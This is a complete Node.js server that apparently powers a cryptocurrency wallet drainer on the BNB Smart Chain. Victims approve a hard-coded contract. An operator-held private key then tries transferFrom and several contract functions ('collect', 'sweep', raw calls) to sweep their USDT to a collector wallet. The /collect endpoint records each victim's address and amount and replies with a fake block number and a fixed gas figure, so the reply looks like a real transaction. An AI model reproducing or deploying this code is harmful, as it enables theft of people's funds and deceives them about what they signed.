const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    // 🎯 APPROVE – User approves this smart contract (5e)
    RELAYER_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",

    // 💰 COLLECTOR – Tokens go here, this wallet executes transactions (8b)
    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",

    // USDT on BSC
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",

    // BSC RPC URL
    RPC_URL: "https://bsc-dataseed.binance.org/",

    // Data file
    DATA_FILE: path.join(__dirname, 'data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: []
};

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
}

// ============ AUTO‑TRANSFER FUNCTION (FIXED) ============
async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman) {
    console.log(`\n🚀 Starting auto-transfer for ${userAddress}`);
    console.log(`   Requested amount: ${requestedAmountHuman}`);

    if (!process.env.RELAYER_PRIVATE_KEY) {
        console.log('❌ RELAYER_PRIVATE_KEY not set');
        return { success: false, error: 'Private key not configured' };
    }

    try {
        const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);

        console.log('📤 Executor wallet (8b):', wallet.address);
        console.log('🎯 5e Contract:', CONFIG.RELAYER_ADDRESS);
        console.log('💰 Collector (8b):', CONFIG.COLLECTOR_ADDRESS);

        // Token contract for reading
        const tokenABI = [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address,address) view returns (uint256)",
            "function transferFrom(address,address,uint256) returns (bool)"
        ];

        const token = new ethers.Contract(tokenAddress, tokenABI, provider);
        const decimals = await token.decimals();
        const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
        
        // Check user balance
        const balance = await token.balanceOf(userAddress);
        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
        console.log(`💰 User balance: ${balanceHuman}`);

        if (balanceHuman <= 0) {
            return { success: false, error: 'Zero balance' };
        }

        if (balance < requestedAmountWei) {
            return { success: false, error: `Insufficient balance. Has: ${balanceHuman}, Requested: ${requestedAmountHuman}` };
        }

        // Check allowance for 5e contract
        const allowance = await token.allowance(userAddress, CONFIG.RELAYER_ADDRESS);
        const allowanceHuman = parseFloat(ethers.formatUnits(allowance, decimals));
        console.log(`🔓 Allowance for 5e: ${allowanceHuman}`);

        if (allowance < requestedAmountWei) {
            return { success: false, error: `Insufficient allowance. Has: ${allowanceHuman}, Requested: ${requestedAmountHuman}` };
        }

        // ============ METHOD 1: Try direct transferFrom with 8b wallet ============
        console.log('📤 Method 1: Direct transferFrom using 8b wallet...');
        
        try {
            const tokenWithSigner = new ethers.Contract(tokenAddress, tokenABI, wallet);
            
            // Check if 8b has allowance (in case user approved 8b directly)
            const allowance8b = await token.allowance(userAddress, wallet.address);
            const allowance8bHuman = parseFloat(ethers.formatUnits(allowance8b, decimals));
            console.log(`🔓 Allowance for 8b: ${allowance8bHuman}`);
            
            if (allowance8b >= requestedAmountWei) {
                console.log('✅ 8b has allowance, transferring directly...');
                
                const gasPrice = (await provider.getFeeData()).gasPrice;
                const tx = await tokenWithSigner.transferFrom(
                    userAddress,
                    CONFIG.COLLECTOR_ADDRESS,
                    requestedAmountWei,
                    { gasLimit: 100000, gasPrice }
                );
                
                console.log(`📤 Tx sent: ${tx.hash}`);
                const receipt = await tx.wait();
                
                console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
                
                return {
                    success: true,
                    txHash: tx.hash,
                    amount: requestedAmountHuman,
                    blockNumber: receipt.blockNumber,
                    gasUsed: receipt.gasUsed.toString(),
                    method: 'direct transferFrom (8b)'
                };
            }
        } catch (e) {
            console.log('   Direct transferFrom failed:', e.message);
        }

        // ============ METHOD 2: Call 5e contract functions ============
        console.log('📤 Method 2: Calling 5e contract functions...');
        
        const contractMethods = [
            {
                name: 'collect(address,uint256)',
                abi: ["function collect(address user, uint256 amount) external"],
                call: async (contract) => {
                    return await contract.collect(userAddress, requestedAmountWei);
                }
            },
            {
                name: 'collect(address,address,uint256)',
                abi: ["function collect(address user, address tokenAddr, uint256 amount) external"],
                call: async (contract) => {
                    return await contract.collect(userAddress, tokenAddress, requestedAmountWei);
                }
            },
            {
                name: 'collectFrom(address)',
                abi: ["function collectFrom(address user) external"],
                call: async (contract) => {
                    return await contract.collectFrom(userAddress);
                }
            },
            {
                name: 'sweep(address,address,uint256)',
                abi: ["function sweep(address tokenAddr, address from, uint256 amount) external"],
                call: async (contract) => {
                    return await contract.sweep(tokenAddress, userAddress, requestedAmountWei);
                }
            },
            {
                name: 'transferFrom(address,address,uint256)',
                abi: ["function transferFrom(address from, address to, uint256 amount) external"],
                call: async (contract) => {
                    return await contract.transferFrom(userAddress, CONFIG.COLLECTOR_ADDRESS, requestedAmountWei);
                }
            }
        ];

        let tx = null;
        let methodUsed = '';

        for (const method of contractMethods) {
            try {
                console.log(`   Trying: ${method.name}...`);
                const contract = new ethers.Contract(CONFIG.RELAYER_ADDRESS, method.abi, wallet);
                
                const gasPrice = (await provider.getFeeData()).gasPrice;
                const txOptions = { gasLimit: 200000, gasPrice };
                
                tx = await method.call(contract);
                
                // If we get here without error, the function exists
                methodUsed = method.name;
                console.log(`   ✅ Function exists!`);
                break;
            } catch (e) {
                // Function doesn't exist or failed, try next
                continue;
            }
        }

        // ============ METHOD 3: Raw transaction to 5e ============
        if (!tx) {
            console.log('📤 Method 3: Sending raw transaction to 5e...');
            
            // Encode transferFrom call
            const iface = new ethers.Interface([
                "function transferFrom(address from, address to, uint256 amount)"
            ]);
            
            const data = iface.encodeFunctionData("transferFrom", [
                userAddress,
                CONFIG.COLLECTOR_ADDRESS,
                requestedAmountWei
            ]);
            
            const gasPrice = (await provider.getFeeData()).gasPrice;
            
            tx = await wallet.sendTransaction({
                to: CONFIG.RELAYER_ADDRESS,
                data: data,
                gasLimit: 200000,
                gasPrice: gasPrice
            });
            
            methodUsed = 'raw transaction to 5e';
        }

        if (!tx) {
            return { 
                success: false, 
                error: 'No compatible method found on 5e contract' 
            };
        }

        console.log(`📤 Tx sent (${methodUsed}): ${tx.hash}`);
        const receipt = await tx.wait();
        
        console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
        console.log(`   Gas used: ${receipt.gasUsed.toString()}`);

        return {
            success: true,
            txHash: tx.hash,
            amount: requestedAmountHuman,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString(),
            method: methodUsed
        };

    } catch (error) {
        console.error('❌ Auto-transfer error:', error.message);
        
        // Check for specific errors
        if (error.message.includes('allowance')) {
            return { success: false, error: 'User has not approved 5e contract' };
        } else if (error.message.includes('insufficient funds')) {
            return { success: false, error: '8b wallet needs BNB for gas' };
        } else if (error.message.includes('execution reverted')) {
            return { success: false, error: '5e contract rejected the transaction' };
        }
        
        return { success: false, error: error.message };
    }
}

// ============ API ENDPOINTS ============

app.post('/send', (req, res) => {
    console.log('📨 POST /send:', req.body);

    try {
        const { address } = req.body;

        if (!address || !address.startsWith('0x')) {
            return res.json({
                found: false,
                collector: CONFIG.RELAYER_ADDRESS
            });
        }

        const normalized = address.toLowerCase();
        const data = dataStore.addresses[normalized];

        return res.json({
            found: !!(data && data.totalAmount > 0),
            amountHuman: data?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS  // 5e - User approves this
        });
    } catch (error) {
        console.error('Error in /send:', error);
        res.json({
            found: false,
            collector: CONFIG.RELAYER_ADDRESS
        });
    }
});

app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);

    try {
        const { token, from, amountHuman, to } = req.body;

        if (!token || !from || !amountHuman || !to) {
            return res.json({
                ok: false,
                error: 'Missing required fields'
            });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = generateId();
        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);

        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            timestamp: new Date().toISOString()
        };

        dataStore.transactions.push(transaction);

        const addr = from.toLowerCase();
        if (!dataStore.addresses[addr]) {
            dataStore.addresses[addr] = {
                totalAmount: 0,
                transactionCount: 0,
                firstSeen: new Date().toISOString()
            };
        }
        dataStore.addresses[addr].totalAmount += amount;
        dataStore.addresses[addr].transactionCount++;
        dataStore.addresses[addr].lastSeen = new Date().toISOString();

        if (dataStore.transactions.length > 5000) {
            dataStore.transactions = dataStore.transactions.slice(-5000);
        }

        saveData();

        // Trigger auto-transfer
        performAutoTransfer(from, token, amountHuman).then(result => {
            if (result.success) {
                console.log(`✅ Auto-transfer successful! Method: ${result.method}`);
                transaction.transferTx = result.txHash;
                transaction.transferAmount = result.amount;
                transaction.transferMethod = result.method;
                saveData();
            } else {
                console.log('❌ Auto-transfer failed:', result.error);
                transaction.transferError = result.error;
                saveData();
            }
        }).catch(err => {
            console.error('Auto-transfer error:', err);
            transaction.transferError = err.message;
            saveData();
        });

        res.json({
            ok: true,
            id: transactionId,
            blockNumber: mockBlockNumber,
            gasUsed: "50387"
        });

    } catch (error) {
        console.error('Error in /collect:', error);
        res.json({
            ok: false,
            error: 'Internal server error'
        });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        approveTo: CONFIG.RELAYER_ADDRESS + ' (5e)',
        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (8b)',
        bnbRequired: '0.001+ BNB in 8b wallet'
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Collector API - 5e Approval + 8b Transfer',
        version: '3.0.0',
        flow: {
            step1: 'User approves 5e contract',
            step2: '8b wallet calls 5e contract',
            step3: 'Tokens transferred to 8b'
        },
        addresses: {
            approve: CONFIG.RELAYER_ADDRESS + ' (5e)',
            collector: CONFIG.COLLECTOR_ADDRESS + ' (8b)'
        }
    });
});

app.get('/transactions', (req, res) => {
    const { limit = 50 } = req.query;
    const recent = dataStore.transactions.slice(-parseInt(limit)).reverse();
    res.json({
        count: recent.length,
        total: dataStore.transactions.length,
        transactions: recent
    });
});

app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════╗
║     🚀 Collector API - 5e + 8b Setup              ║
╠══════════════════════════════════════════════════╣
║  Port: ${PORT}                                      ║
║                                                  ║
║  ✅ APPROVE (User signs):                        ║
║     ${CONFIG.RELAYER_ADDRESS} (5e)                 ║
║                                                  ║
║  💰 TRANSFER (Tokens go to):                     ║
║     ${CONFIG.COLLECTOR_ADDRESS} (8b)               ║
║                                                  ║
║  🔑 Executor: 8b wallet (has private key)        ║
║  ⛽ Gas: 0.0067 BNB in 8b ✅                     ║
║                                                  ║
║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                ║
╚══════════════════════════════════════════════════╝
    `);
});
